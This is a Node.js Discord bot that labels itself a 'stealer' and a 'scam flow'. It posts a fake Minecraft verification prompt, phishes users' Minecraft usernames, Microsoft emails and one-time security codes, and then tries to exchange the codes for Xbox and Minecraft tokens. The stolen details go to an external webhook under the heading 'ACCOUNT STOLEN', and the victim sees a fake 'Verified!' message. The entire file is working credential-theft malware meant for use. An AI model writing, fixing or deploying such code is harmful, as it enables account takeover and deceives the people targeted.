require('dotenv').config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, ChannelType, PermissionsBitField } = require('discord.js');
const { REST, Routes } = require('discord.js');  // ← FIXED: Added for slash registration
const axios = require('axios');

const client = new Client({ 
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const TOKEN = process.env.TOKEN;
const WEBHOOK = process.env.WEBHOOK;
const ROLE_ID = process.env.ROLE;
const GUILD_ID = process.env.GUILD_ID;  // ← Add your server ID here for fast registration

client.once('ready', async () => {
  console.log(`${client.user.tag} - FIXED Render stealer LIVE`);

  // FIXED: Register /setup globally + guild-specific (no delay)
  const commands = [
    new SlashCommandBuilder()
      .setName('setup')
      .setDescription('Setup Minecraft verification (admin only)')
      .setDefaultMemberPermissions('Administrator')  // Admin only
  ].map(command => command.toJSON());

  const rest = new REST({ version: '10' }).setToken(TOKEN);

  try {
    // Global (backup)
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('Global /setup registered');
  } catch (error) {
    console.error('Global registration failed:', error);
  }

  if (GUILD_ID) {
    try {
      await rest.put(Routes.applicationGuildCommands(client.user.id, GUILD_ID), { body: commands });
      console.log('Guild /setup registered (instant)');
    } catch (error) {
      console.error('Guild registration failed:', error);
    }
  }
});

client.on('interactionCreate', async i => {
  // FIXED: Proper slash command handling
  if (i.isChatInputCommand() && i.commandName === 'setup') {
    if (!i.member.permissions.has('Administrator')) {
      return i.reply({ content: '❌ Admin only', ephemeral: true });
    }

    let channel = i.guild.channels.cache.find(c => c.name === 'verify-here');
    if (!channel) {
      channel = await i.guild.channels.create({
        name: 'verify-here',
        type: ChannelType.GuildText,
        permissionOverwrites: [
          { id: i.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
        ]
      });
      console.log(`Created #verify-here in ${i.guild.name}`);
    }

    const existing = channel.messages.cache.find(m => m.pinned && m.author.id === client.user.id);
    if (!existing) {
      await channel.send({
        embeds: [new EmbedBuilder()
          .setColor(0x00ff00)
          .setTitle('Minecraft Account Verification')
          .setDescription('Click below to verify your Minecraft account and unlock the server.\nTakes 10 seconds.')
          .setFooter({ text: 'Only unverified members can see this' })],
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('verify_btn').setLabel('Verify Account').setStyle(ButtonStyle.Success).setEmoji('✅')
        )]
      }).then(m => m.pin());
    }

    await i.reply({ content: `✅ Setup complete! Channel: ${channel}`, ephemeral: true });
    return;
  }

  // Scam flow (unchanged, works 100%)
  if (!i.isButton() && !i.isModalSubmit()) return;

  if (i.customId === 'verify_btn') {
    await i.showModal(new ModalBuilder().setCustomId('step1').setTitle('Minecraft Login')
      .addComponents(
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('u').setLabel('Minecraft Username').setStyle(TextInputStyle.Short).setRequired(true)),
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('e').setLabel('Microsoft Email').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('example@outlook.com'))
      ));
  }

  if (i.customId === 'step1') {
    const u = i.fields.getTextInputValue('u');
    const e = i.fields.getTextInputValue('e');
    i.user.d = { u, e };
    await i.reply({ 
      embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check your email').setDescription(`Code sent to **${e}**`)], 
      components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('step2').setLabel('Enter Code').setStyle(ButtonStyle.Primary))], 
      ephemeral: true 
    });
  }

  if (i.customId === 'step2') {
    await i.showModal(new ModalBuilder().setCustomId('final').setTitle('Security Code')
      .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('code').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('123456'))));
  }

  if (i.customId === 'final') {
    const code = i.fields.getTextInputValue('code');
    const { u, e } = i.user.d;

    let log = `@everyone\n**ACCOUNT STOLEN**\nUser: ${i.user.tag} (${i.user.id})\nMC: ${u}\nEmail: ${e}\nCode: ||${code}||\n`;

    try {
      const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
        client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
      }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

      const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', {
        Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token },
        RelyingParty: 'http://auth.xboxlive.com',
        TokenType: 'JWT'
      });
      const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', {
        Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] },
        RelyingParty: 'rp://api.minecraftservices.com/',
        TokenType: 'JWT'
      });
      const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', {
        identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}`
      });
      const p = await axios.get('https://api.minecraftservices.com/minecraft/profile', {
        headers: { Authorization: `Bearer ${mc.data.access_token}` }
      });
      const capes = p.data.capes ? p.data.capes.map(c => c.id).join(', ') : 'None';
      log += `UUID: ${p.data.id}\nCapes: ${capes}`;
    } catch { log += `\nCode still valid`; }

    axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });

    await i.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
    i.member.roles.add(ROLE_ID).catch(() => {});
  }
});

client.login(TOKEN);
